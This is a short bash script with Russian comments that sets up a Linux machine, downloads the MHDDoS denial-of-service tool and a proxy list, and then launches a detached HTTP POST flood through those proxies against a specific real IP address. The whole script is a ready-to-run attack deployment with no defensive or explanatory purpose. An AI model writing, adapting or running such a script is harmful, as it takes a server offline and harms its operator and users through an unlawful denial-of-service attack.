#!/bin/bash

cd ~

# Обновление системы
sudo dnf -y update

# Установка необходимых пакетов
sudo dnf -y install curl wget libcurl libssl-dev python36 python3-pip make cmake automake autoconf m4 gcc gcc-c++ git screen

# Клонирование репозиториев
git clone https://github.com/MatrixTM/MHDDoS.git
git clone https://github.com/romen1w2/prox.git

# Перемещение файла
mv ~/prox/proxy.txt ~/MHDDoS/files/proxies/

# Установка Python зависимостей и запуск скрипта
cd ~/MHDDoS/
pip3 install -r requirements.txt
screen -dm python3 start.py post http://88.198.48.45 5 9999 proxy.txt 100 60
